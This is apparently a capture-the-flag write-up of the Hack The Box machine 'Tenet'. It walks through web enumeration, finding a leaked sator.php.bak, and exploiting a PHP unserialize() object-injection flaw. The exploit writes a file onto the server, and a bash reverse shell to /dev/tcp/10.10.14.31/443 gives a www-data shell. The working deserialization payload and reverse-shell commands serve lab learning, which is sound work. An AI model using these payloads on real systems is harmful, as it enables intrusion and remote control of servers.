</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">→ root@kali «tenet» «192.168.43.234» 
$ nmap -sC -sV -p$ports -oA scans/full-tenet 10.10.10.223
<span style="color:#75715e"># Nmap 7.80 scan initiated Tue Mar 16 23:32:46 2021 as: nmap -sC -sV -p22,80 -oA scans/full-tenet 10.10.10.223</span>
Nmap scan report <span style="color:#66d9ef">for</span> 10.10.10.223
Host is up <span style="color:#f92672">(</span>0.059s latency<span style="color:#f92672">)</span>.
Scanned at 2021-03-16 23:32:46 EDT <span style="color:#66d9ef">for</span> 17s

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 <span style="color:#f92672">(</span>Ubuntu Linux; protocol 2.0<span style="color:#f92672">)</span>
| ssh-hostkey: 
|   <span style="color:#ae81ff">2048</span> cc:ca:43:d4:4c:e7:4e:bf:26:f4:27:ea:b8:75:a8:f8 <span style="color:#f92672">(</span>RSA<span style="color:#f92672">)</span>
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDA4SymrtoAxhSnm6gIUPFcp1VhjoVue64X4LIvoYolM5BQPblUj2aezdd9aRI227jVzfkOD4Kg3OW2yT5uxFljn7q/Mh5/muGvUNA+nNO6pCC0tZPoPEwMT+QvR3XyQXxbP6povh4GISBySLw/DFQoG3A2t80Giyq5Q7P+1LH1f/m63DyiNXOPS8fNBPz59BDEgC9jJ5Lu2DTu8ko1xE/85MLYyBKRSFHEkqagRXIYUwVQASHgo3OoJ+VAcBTJZH1TmXDc4c6W0hIPpQW5dyvj3tdjKjlIkw6dH2at9NL3gnTP5xnsoiOu0dyofm2L5fvBpzvOzUnQ2rps2wANTZwZ
|   <span style="color:#ae81ff">256</span> 85:f3:ac:ba:1a:6a:03:59:e2:7e:86:47:e7:3e:3c:00 <span style="color:#f92672">(</span>ECDSA<span style="color:#f92672">)</span>
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBLMM1BQpjspHo9teJwTFZntx+nxj8D51/Nu0nI3atUpyPg/bXlNYi26boH8zYTrC6fWepgaG2GZigAqxN4yuwgo<span style="color:#f92672">=</span>
|   <span style="color:#ae81ff">256</span> e7:e9:9a:dd:c3:4a:2f:7a:e1:e0:5d:a2:b0:ca:44:a8 <span style="color:#f92672">(</span>ED25519<span style="color:#f92672">)</span>
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIMQeNqzXOE6aVR3ulHIyB8EGf1ZaUSCNuou5+cgmNXvt
80/tcp open  http    Apache httpd 2.4.29 <span style="color:#f92672">((</span>Ubuntu<span style="color:#f92672">))</span>
| http-methods: 
|_  Supported Methods: OPTIONS
|_http-server-header: Apache/2.4.29 <span style="color:#f92672">(</span>Ubuntu<span style="color:#f92672">)</span>
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
<span style="color:#75715e"># Nmap done at Tue Mar 16 23:33:03 2021 -- 1 IP address (1 host up) scanned in 16.80 seconds</span>
</code></pre></div><h2 id="enumeration">Enumeration</h2>
<h3 id="tcp-80---website">TCP 80 - Website</h3>
<p><code>nmap</code> already identified that this site shows the default page of Apache web server.</p>
<p><img class="img-container" src="imgs/image-20210614165913959.png" alt="image-20210614165913959"  />
</p>
<h4 id="gobuster">Gobuster</h4>
<p>Running <code>gobuster</code> against the site reveals that there is a WordPress site.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">→ root@kali «tenet» «10.10.14.31» 
$ gobuster dir -u http://10.10.10.223/ -w /opt/SecLists/Discovery/Web-Content/common.txt -b 404,403 -x txt,php,bak -o gobuster/gobuster-nohostname
<span style="color:#f92672">===============================================================</span>
Gobuster v3.1.0
by OJ Reeves <span style="color:#f92672">(</span>@TheColonial<span style="color:#f92672">)</span> &amp; Christian Mehlmauer <span style="color:#f92672">(</span>@firefart<span style="color:#f92672">)</span>
<span style="color:#f92672">===============================================================</span>
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Url:                     http://10.10.10.223/
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Method:                  GET
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Threads:                 <span style="color:#ae81ff">10</span>
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Wordlist:                /opt/SecLists/Discovery/Web-Content/common.txt
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Negative Status codes:   403,404
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> User Agent:              gobuster/3.1.0
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Extensions:              txt,php,bak
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Timeout:                 10s
<span style="color:#f92672">===============================================================</span>
2021/06/14 06:08:53 Starting gobuster in directory enumeration mode
<span style="color:#f92672">===============================================================</span>
/index.html           <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 10918<span style="color:#f92672">]</span>
/users.txt            <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 7<span style="color:#f92672">]</span>    
/wordpress            <span style="color:#f92672">(</span>Status: 301<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 316<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; http://10.10.10.223/wordpress/<span style="color:#f92672">]</span>
                                                                                    
<span style="color:#f92672">===============================================================</span>
2021/06/14 06:11:20 Finished
<span style="color:#f92672">===============================================================</span>
</code></pre></div><p>Poking <code>/users.txt</code> returns a text &ldquo;Success&rdquo;, I don&rsquo;t know what&rsquo;s that means.</p>
<p><img class="img-container" src="imgs/image-20210614171354046.png" alt="image-20210614171354046"  />
</p>
<h4 id="wordpress">/wordpress</h4>
<p>Somehow on <code>/wordpress</code>,  the site looks broken.</p>
<p><img class="img-container" src="imgs/image-20210614171926106.png" alt="image-20210614171926106"  />
</p>
<p>It turns out there is a hostname.</p>
<p><img class="img-container" src="imgs/image-20210614172030551.png" alt="image-20210614172030551"  />
</p>
<p>I&rsquo;ll add tenet.htb to my <code>/etc/hosts</code></p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">→ root@kali «tenet» «10.10.14.31» 
$ echo <span style="color:#e6db74">&#39;tenet.htb 10.10.10.223&#39;</span> &gt;&gt; /etc/hosts
</code></pre></div><p>Poking <code>curl</code> shows that this port has different contents when we visit it with a hostname.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">→ root@kali «tenet» «10.10.14.31» 
$ curl -s http://10.10.10.223 | wc -c
<span style="color:#ae81ff">10918</span>
→ root@kali «tenet» «10.10.14.31» 
$ curl -s http://tenet.htb | wc -c 
<span style="color:#ae81ff">10581</span>
</code></pre></div><p>From here, I&rsquo;ll separate the enumeration on new section.</p>
<h3 id="tcp-80---tenethtb">TCP 80 - tenet.htb</h3>
<p>Probably <code>http://10.10.10.223/wordpress/</code> is redirected to <code>tenet.htb</code> by the web server.</p>
<p><img class="img-container" src="imgs/image-20210614173225299.png" alt="image-20210614173225299"  />
</p>
<p>There is one post titled with &ldquo;Migrations&rdquo; states that they&rsquo;re currently migrating the data from a flat file.</p>
<p><img class="img-container" src="imgs/image-20210614173704577.png" alt="image-20210614173704577"  />
</p>
<blockquote>
<p>/etc/passwd and /etc/shadow are the examples of what is known as a flat file structure.</p>
</blockquote>
<p>At the bottom, there is one user commented on the migration post which is probably the hint.</p>
<p><img class="img-container" src="imgs/image-20210614174052879.png" alt="image-20210614174052879"  />
</p>
<p>I&rsquo;ll note that &ldquo;sator php&rdquo; file and also a backup of that file.</p>
<h4 id="wpscan">WPScan</h4>
<p>I ran a <code>wpscan</code>  to find some database backup or something related with that, but I didn&rsquo;t find anything except usernames.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">→ root@kali «tenet» «10.10.14.31» 
$ wpscan --url http://tenet.htb/ -e vp,vt,cb,dbe,u1-15                                                          
_______________________________________________________________
         __          _______   _____
         <span style="color:#ae81ff">\ \ </span>       / /  __ <span style="color:#ae81ff">\ </span>/ ____|
          <span style="color:#ae81ff">\ \ </span> /<span style="color:#ae81ff">\ </span> / /| |__<span style="color:#f92672">)</span> | <span style="color:#f92672">(</span>___   ___  __ _ _ __ ®
           <span style="color:#ae81ff">\ \/</span>  <span style="color:#ae81ff">\/</span> / |  ___/ <span style="color:#ae81ff">\_</span>__ <span style="color:#ae81ff">\ </span>/ __|/ _<span style="color:#e6db74">`</span> | <span style="color:#960050;background-color:#1e0010">&#39;</span>_ <span style="color:#ae81ff">\
</span><span style="color:#ae81ff"></span>            <span style="color:#ae81ff">\ </span> /<span style="color:#ae81ff">\ </span> /  | |     ____<span style="color:#f92672">)</span> | <span style="color:#f92672">(</span>__| <span style="color:#f92672">(</span>_| | | | |
             <span style="color:#ae81ff">\/</span>  <span style="color:#ae81ff">\/</span>   |_|    |_____/ <span style="color:#ae81ff">\_</span>__|<span style="color:#ae81ff">\_</span>_,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.17
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________
...&lt;SNIP&gt;...
<span style="color:#f92672">[</span>i<span style="color:#f92672">]</span> User<span style="color:#f92672">(</span>s<span style="color:#f92672">)</span> Identified:

<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> protagonist
 | Found By: Author Posts - Author Pattern <span style="color:#f92672">(</span>Passive Detection<span style="color:#f92672">)</span>
 | Confirmed By:
 |  Rss Generator <span style="color:#f92672">(</span>Passive Detection<span style="color:#f92672">)</span>
 |  Wp Json Api <span style="color:#f92672">(</span>Aggressive Detection<span style="color:#f92672">)</span>
 |   - http://tenet.htb/index.php/wp-json/wp/v2/users/?per_page<span style="color:#f92672">=</span>100&amp;page<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span>
 |  Author Id Brute Forcing - Author Pattern <span style="color:#f92672">(</span>Aggressive Detection<span style="color:#f92672">)</span>
 |  Login Error Messages <span style="color:#f92672">(</span>Aggressive Detection<span style="color:#f92672">)</span>

<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> neil
 | Found By: Author Id Brute Forcing - Author Pattern <span style="color:#f92672">(</span>Aggressive Detection<span style="color:#f92672">)</span>
 | Confirmed By: Login Error Messages <span style="color:#f92672">(</span>Aggressive Detection<span style="color:#f92672">)</span>
</code></pre></div><h4 id="directory-brute-force-guessing">Directory brute-force (Guessing)</h4>
<p>I tried to guess the location of sator php files with <code>curl</code> but it returned with 404.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">→ root@kali «tenet» «10.10.14.31» 
$ <span style="color:#66d9ef">for</span> i in sator.php sator.php.bak; <span style="color:#66d9ef">do</span> curl -sIL http://tenet.htb/$i; <span style="color:#66d9ef">done</span>
HTTP/1.1 <span style="color:#ae81ff">404</span> Not Found
Date: Mon, <span style="color:#ae81ff">14</span> Jun <span style="color:#ae81ff">2021</span> 10:51:50 GMT
Server: Apache/2.4.29 <span style="color:#f92672">(</span>Ubuntu<span style="color:#f92672">)</span>
Content-Type: text/html; charset<span style="color:#f92672">=</span>iso-8859-1

HTTP/1.1 <span style="color:#ae81ff">404</span> Not Found
Date: Mon, <span style="color:#ae81ff">14</span> Jun <span style="color:#ae81ff">2021</span> 10:51:51 GMT
Server: Apache/2.4.29 <span style="color:#f92672">(</span>Ubuntu<span style="color:#f92672">)</span>
Content-Type: text/html; charset<span style="color:#f92672">=</span>iso-8859-1
</code></pre></div><h3 id="vhost-enumeration">Vhost enumeration</h3>
<p>Next, I&rsquo;ll try to enumerate vhost, but first I&rsquo;ll use <code>cewl</code> to generate a custom wordlist. Because &ldquo;sator&rdquo; and &ldquo;backup&rdquo; are consists of 5 characters, I&rsquo;ll set the minimum word length to 5.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">→ root@kali «tenet» «10.10.14.31» 
$ cewl -m <span style="color:#ae81ff">5</span> -w wordlist-vhost http://tenet.htb
CeWL 5.4.6 <span style="color:#f92672">(</span>Exclusion<span style="color:#f92672">)</span> Robin Wood <span style="color:#f92672">(</span>robin@digi.ninja<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>https://digi.ninja/<span style="color:#f92672">)</span>
</code></pre></div><p>I tried the wordlist with <code>ffuf</code>, but didn&rsquo;t find any (damn this tool is insanely fast, took 5 sec).</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">→ root@kali «tenet» «10.10.14.31» 
$ ffuf -w wordlist-vhost -u http://10.10.10.223 -H <span style="color:#e6db74">&#34;Host: FUZZ.tenet.htb&#34;</span> -mc <span style="color:#ae81ff">200</span> -fl <span style="color:#ae81ff">376</span>

        /<span style="color:#e6db74">&#39;___\  /&#39;</span>___<span style="color:#ae81ff">\ </span>          /<span style="color:#960050;background-color:#1e0010">&#39;</span>___<span style="color:#ae81ff">\ </span>      
       /<span style="color:#ae81ff">\ \_</span>_/ /<span style="color:#ae81ff">\ \_</span>_/  __  __  /<span style="color:#ae81ff">\ \_</span>_/       
       <span style="color:#ae81ff">\ \ </span>,__<span style="color:#ae81ff">\\</span> <span style="color:#ae81ff">\ </span>,__<span style="color:#ae81ff">\/\ \/\ \ \ \ </span>,__<span style="color:#ae81ff">\ </span>     
        <span style="color:#ae81ff">\ \ \_</span>/ <span style="color:#ae81ff">\ \ \_</span>/<span style="color:#ae81ff">\ \ \_\ \ \ \ \_</span>/      
         <span style="color:#ae81ff">\ \_\ </span>  <span style="color:#ae81ff">\ \_\ </span> <span style="color:#ae81ff">\ \_</span>___/  <span style="color:#ae81ff">\ \_\ </span>      
          <span style="color:#ae81ff">\/</span>_/    <span style="color:#ae81ff">\/</span>_/   <span style="color:#ae81ff">\/</span>___/    <span style="color:#ae81ff">\/</span>_/       

       v1.3.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.10.223
 :: Wordlist         : FUZZ: wordlist-vhost
 :: Header           : Host: FUZZ.tenet.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : <span style="color:#ae81ff">10</span>
 :: Threads          : <span style="color:#ae81ff">40</span>
 :: Matcher          : Response status: <span style="color:#ae81ff">200</span>
 :: Filter           : Response lines: <span style="color:#ae81ff">376</span>
________________________________________________

:: Progress: <span style="color:#f92672">[</span>93/93<span style="color:#f92672">]</span> :: Job <span style="color:#f92672">[</span>1/1<span style="color:#f92672">]</span> :: <span style="color:#ae81ff">11</span> req/sec :: Duration: <span style="color:#f92672">[</span>0:00:05<span style="color:#f92672">]</span> :: Errors: <span style="color:#ae81ff">0</span> ::
</code></pre></div><h3 id="apache-default-page-revisit">Apache Default Page (Revisit)</h3>
<p>I found the files that user Neil was talking about at  <code>http://10.10.10.223/[here]</code>, without the hostname:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">→ root@kali «tenet» «10.10.14.31» 
$ <span style="color:#66d9ef">for</span> i in sator.php sator.php.bak; <span style="color:#66d9ef">do</span> curl -sIL http://10.10.10.223/$i; <span style="color:#66d9ef">done</span>
HTTP/1.1 <span style="color:#ae81ff">200</span> OK
Date: Mon, <span style="color:#ae81ff">14</span> Jun <span style="color:#ae81ff">2021</span> 11:21:04 GMT
Server: Apache/2.4.29 <span style="color:#f92672">(</span>Ubuntu<span style="color:#f92672">)</span>
Content-Type: text/html; charset<span style="color:#f92672">=</span>UTF-8

HTTP/1.1 <span style="color:#ae81ff">200</span> OK
Date: Mon, <span style="color:#ae81ff">14</span> Jun <span style="color:#ae81ff">2021</span> 11:21:05 GMT
Server: Apache/2.4.29 <span style="color:#f92672">(</span>Ubuntu<span style="color:#f92672">)</span>
Last-Modified: Thu, <span style="color:#ae81ff">17</span> Dec <span style="color:#ae81ff">2020</span> 09:52:50 GMT
ETag: <span style="color:#e6db74">&#34;202-5b6a5f47911e4&#34;</span>
Accept-Ranges: bytes
Content-Length: <span style="color:#ae81ff">514</span>
Content-Type: application/x-trash
</code></pre></div><p>Another guessing, I think the keyword is &ldquo;Migration&rdquo;, so probably before moving into <code>/wordpress/</code>, the site was previously hosted at  <code>/</code> (the root).</p>
<p>Poking <code>Sator.php</code>:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">→ root@kali «tenet» «10.10.14.31» 
$ curl -s http://10.10.10.223/sator.php
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Grabbing users from text file &lt;br&gt;
<span style="color:#f92672">[]</span> Database updated &lt;br&gt;
</code></pre></div><p>Poking <code>sator.php.bak</code>:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">→ root@kali «tenet» «10.10.14.31» 
$ curl -s http://10.10.10.223/sator.php.bak
&lt;?php

class DatabaseExport
<span style="color:#f92672">{</span>
        public $user_file <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;users.txt&#39;</span>;
        public $data <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;</span>;

        public <span style="color:#66d9ef">function</span> update_db<span style="color:#f92672">()</span>
        <span style="color:#f92672">{</span>
                echo <span style="color:#e6db74">&#39;[+] Grabbing users from text file &lt;br&gt;&#39;</span>;
                $this-&gt; data <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;Success&#39;</span>;
        <span style="color:#f92672">}</span>


        public <span style="color:#66d9ef">function</span> __destruct<span style="color:#f92672">()</span>
        <span style="color:#f92672">{</span>
                file_put_contents<span style="color:#f92672">(</span>__DIR__ . <span style="color:#e6db74">&#39;/&#39;</span> . $this -&gt;user_file, $this-&gt;data<span style="color:#f92672">)</span>;
                echo <span style="color:#e6db74">&#39;[] Database updated &lt;br&gt;&#39;</span>;
        //      echo <span style="color:#e6db74">&#39;Gotta get this working properly...&#39;</span>;
        <span style="color:#f92672">}</span>
<span style="color:#f92672">}</span>

$input <span style="color:#f92672">=</span> $_GET<span style="color:#f92672">[</span><span style="color:#e6db74">&#39;arepo&#39;</span><span style="color:#f92672">]</span> ?? <span style="color:#e6db74">&#39;&#39;</span>;
$databaseupdate <span style="color:#f92672">=</span> unserialize<span style="color:#f92672">(</span>$input<span style="color:#f92672">)</span>;

$app <span style="color:#f92672">=</span> new DatabaseExport;
$app -&gt; update_db<span style="color:#f92672">()</span>;


?&gt;
</code></pre></div><h3 id="source-code-analysis">Source Code Analysis</h3>
<h4 id="deserialization-vulnerability">Deserialization vulnerability</h4>
<p>First, from the previous code, <code>sator.php.bak</code> contains a PHP magic function called <code>__destruct()</code>. I&rsquo;m not skilled enough to explain it on detail, but from what I know is the function will be called when there is no more references to an object (comment by me):</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php">$app <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">DatabaseExport</span>;
$app <span style="color:#f92672">-&gt;</span> <span style="color:#a6e22e">update_db</span>(); 
<span style="color:#75715e">// __destruct is called afterwards
</span><span style="color:#75715e">// [] Database updated will be printed out
</span></code></pre></div><p>Here&rsquo;s an example:</p>
<p><img class="img-container" src="imgs/image-20210614190334075.png" alt="image-20210614190334075"  />
</p>
<p>Second, the user-controlled input with parameter <code>arepo</code> is directly passed to <code>unserialize()</code> function. Knowing this, I could send a malicious DatabaseExport object (serialized) by assuming that <code>sator.php</code> uses the same code as <code>sator.php.bak</code>.</p>
<p>Since <code>unserialize</code> is called before the creation of object (<code>$app</code>), I&rsquo;ll use the opposite magic function called <code>__construct()</code>.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#f92672">...&lt;</span><span style="color:#a6e22e">SNIP</span><span style="color:#f92672">&gt;...</span>
$input <span style="color:#f92672">=</span> $_GET[<span style="color:#e6db74">&#39;arepo&#39;</span>] <span style="color:#f92672">??</span> <span style="color:#e6db74">&#39;&#39;</span>;
$databaseupdate <span style="color:#f92672">=</span> <span style="color:#a6e22e">unserialize</span>($input);

$app <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">DatabaseExport</span>;
$app <span style="color:#f92672">-&gt;</span> <span style="color:#a6e22e">update_db</span>();
</code></pre></div><h2 id="foothold">Foothold</h2>
<h3 id="shell-as-www-data">Shell as www-data</h3>
<h4 id="object-injectiondeserialization-poc">Object Injection/Deserialization PoC</h4>
<p>First, I&rsquo;ll just do some testing with this script below and save it to a file called <code>tenetization.php</code>:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
<span style="color:#66d9ef">class</span> <span style="color:#a6e22e">DatabaseExport</span>
{
        <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> __construct()
        {
        		$this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">user_file</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;test.php&#39;</span>;
                $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">data</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&lt;?php phpinfo(); ?&gt;&#34;</span>;
        }
}
$o <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">DatabaseExport</span>();
<span style="color:#66d9ef">echo</span> <span style="color:#a6e22e">urlencode</span>(<span style="color:#a6e22e">serialize</span>($o));
<span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
</span></code></pre></div><p>I use URL encode there because I&rsquo;m going to use <code>curl</code> to interact with the site.</p>
<p>I&rsquo;ll run that script.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">→ root@kali «exploits» «10.10.14.31»
$ php tenetization.php
O%3A14%3A%22DatabaseExport%22%3A2%3A%7Bs%3A9%3A%22user_file%22%3Bs%3A8%3A%22test.php%22%3Bs%3A4%3A%22data%22%3Bs%3A19%3A%22%3C%3Fphp+phpinfo%28%29%3B+%3F%3E%22%3B%7D
</code></pre></div><p>If I don&rsquo;t have PHP. I could use <a href="https://www.w3schools.com/php/phptryit.asp?filename=tryphp_compiler">this site</a> to get output of my PHP script.</p>
<p>I&rsquo;ll send that output to <code>sator.php</code> via <code>curl</code></p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">→ root@kali «exploits» «10.10.14.31»
$ curl -sI <span style="color:#e6db74">&#34;http://10.10.10.223/sator.php?arepo=O%3A14%3A%22DatabaseExport%22%3A2%3A%7Bs%3A9%3A%22user_file%22%3Bs%3A8%3A%22test.php%22%3Bs%3A4%3A%22data%22%3Bs%3A19%3A%22%3C%3Fphp+phpinfo%28%29%3B+%3F%3E%22%3B%7D&#34;</span>
HTTP/1.1 <span style="color:#ae81ff">200</span> OK
Date: Mon, <span style="color:#ae81ff">14</span> Jun <span style="color:#ae81ff">2021</span> 12:43:43 GMT
Server: Apache/2.4.29 <span style="color:#f92672">(</span>Ubuntu<span style="color:#f92672">)</span>
Content-Type: text/html; charset<span style="color:#f92672">=</span>UTF-8
</code></pre></div><p>And that works!</p>
<p><img class="img-container" src="imgs/image-20210614194451145.png" alt="image-20210614194451145"  />
</p>
<p>Based on 0xdf&rsquo;s awesome <a href="https://0xdf.gitlab.io/2021/06/12/htb-tenet.html#create-serialized-object">writeup</a>,  this payload would also works:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
<span style="color:#66d9ef">class</span> <span style="color:#a6e22e">DatabaseExport</span>
{
		<span style="color:#66d9ef">public</span> <span style="color:#a6e22e">user_file</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;test.php&#39;</span>;
		<span style="color:#66d9ef">public</span> <span style="color:#a6e22e">data</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&lt;?php phpinfo(); ?&gt;&#34;</span>;
}
$o <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">DatabaseExport</span>();
<span style="color:#66d9ef">echo</span> <span style="color:#a6e22e">urlencode</span>(<span style="color:#a6e22e">serialize</span>($o));
<span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
</span></code></pre></div><h4 id="weaponize---reverse-shell">Weaponize - Reverse Shell</h4>
<p>I&rsquo;ll modify the file name and the data for reverse shell.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
<span style="color:#66d9ef">class</span> <span style="color:#a6e22e">DatabaseExport</span>
{
        <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> __construct()
        {
        		$this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">user_file</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;iamf.php&#39;</span>;
                $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">data</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&lt;?php system(</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">/bin/bash -c &#39;bash -i &gt;&amp; /dev/tcp/10.10.14.31/443 0&gt;&amp;1&#39; </span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">) ?&gt;&#34;</span>;
        }
}
$o <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">DatabaseExport</span>();
<span style="color:#66d9ef">echo</span> <span style="color:#a6e22e">urlencode</span>(<span style="color:#a6e22e">serialize</span>($o));
<span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
</span></code></pre></div><p>I&rsquo;ll use this script to send that and then wait on my listener</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e">#!/bin/bash
</span><span style="color:#75715e"></span>
serial<span style="color:#f92672">=</span><span style="color:#e6db74">`</span>php tenetization.php<span style="color:#e6db74">`</span>
curl -s http://10.10.10.223/sator.php?arepo<span style="color:#f92672">=</span>$serial
sleep 5;
curl -s http://10.10.10.223/iamf.php
</code></pre></div><p>When I run the exploit, it hangs.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">→ root@kali «exploits» «10.10.14.31»
$ bash tenetization.sh
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Grabbing users from text file &lt;br&gt;
<span style="color:#f92672">[]</span> Database updated &lt;br&gt;<span style="color:#f92672">[]</span> Database updated &lt;br&gt;
</code></pre></div><p>But after a few seconds, I&rsquo;ve shell on my listener</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">→ root@kali «~» «10.10.14.31»
$ nc -nvlp <span style="color:#ae81ff">443</span>
listening on <span style="color:#f92672">[</span>any<span style="color:#f92672">]</span> <span style="color:#ae81ff">443</span> ...
connect to <span style="color:#f92672">[</span>10.10.14.31<span style="color:#f92672">]</span> from <span style="color:#f92672">(</span>UNKNOWN<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>10.10.10.223<span style="color:#f92672">]</span> <span style="color:#ae81ff">39174</span>
bash: cannot set terminal process group <span style="color:#f92672">(</span>1545<span style="color:#f92672">)</span>: Inappropriate ioctl <span style="color:#66d9ef">for</span> device
bash: no job control in this shell
www-data@tenet:/var/www/html$ id
id
uid<span style="color:#f92672">=</span>33<span style="color:#f92672">(</span>www-data<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>33<span style="color:#f92672">(</span>www-data<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>33<span style="color:#f92672">(</span>www-data<span style="color:#f92672">)</span>
www-data@tenet:/var/www/html$
</code></pre></div><p><img class="img-container" src="imgs/image-20210614195508219.png" alt="image-20210614195508219"  />
</p>
